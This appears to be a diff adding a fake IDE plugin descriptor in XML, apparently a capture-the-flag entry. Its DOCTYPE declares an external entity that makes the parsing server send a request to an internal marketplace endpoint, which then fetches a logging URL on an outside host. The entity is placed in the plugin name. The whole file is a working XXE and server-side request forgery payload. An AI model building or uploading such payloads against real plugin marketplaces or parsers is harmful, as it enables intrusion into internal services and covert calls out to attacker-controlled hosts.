@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "http://marketplace:8080/make_request?url=https://ctf-3.ertel.one/log/xzcvb&httpMethod=GET&headers=" >]>
+<ide-plugin>
+    <name>&xxe;</name>
+    <id>org.plugin.package</id>
+    <version>1.0</version>
+</ide-plugin>
